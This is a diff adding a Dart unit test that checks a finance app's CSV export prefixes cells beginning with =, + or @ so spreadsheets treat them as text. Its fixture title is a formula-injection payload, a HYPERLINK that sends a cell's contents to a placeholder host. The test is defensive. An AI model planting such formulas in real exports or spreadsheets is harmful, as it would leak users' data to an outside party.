@@ -103,4 +103,27 @@ void main() {
     expect(rows, hasLength(2));
     expect(rows[1].sublist(5), ['Bank', 'EUR', 'Food', 'Restaurants', '']);
   });
+
+  test('prefixes text cells that spreadsheets would read as formulas', () {
+    final injected = MoneyTransaction(
+      id: 'injected',
+      date: DateTime(2026, 5, 15),
+      value: -45900,
+      isHidden: false,
+      type: TransactionType.expense,
+      account: _account('@Bank', 'EUR'),
+      accountCurrency: _eur,
+      title: '=HYPERLINK("https://example.invalid/?d="&F2,"x")',
+      notes: '+1 555 0100',
+      currentValueInPreferredCurrency: -45900,
+      tags: const [],
+    );
+
+    final rows = _export([injected]);
+
+    expect(rows[1].sublist(1, 2), ['-45900.00']);
+    expect(rows[1][3], '\'=HYPERLINK("https://example.invalid/?d="&F2,"x")');
+    expect(rows[1][4], "'+1 555 0100");
+    expect(rows[1][5], "'@Bank");
+  });
 }
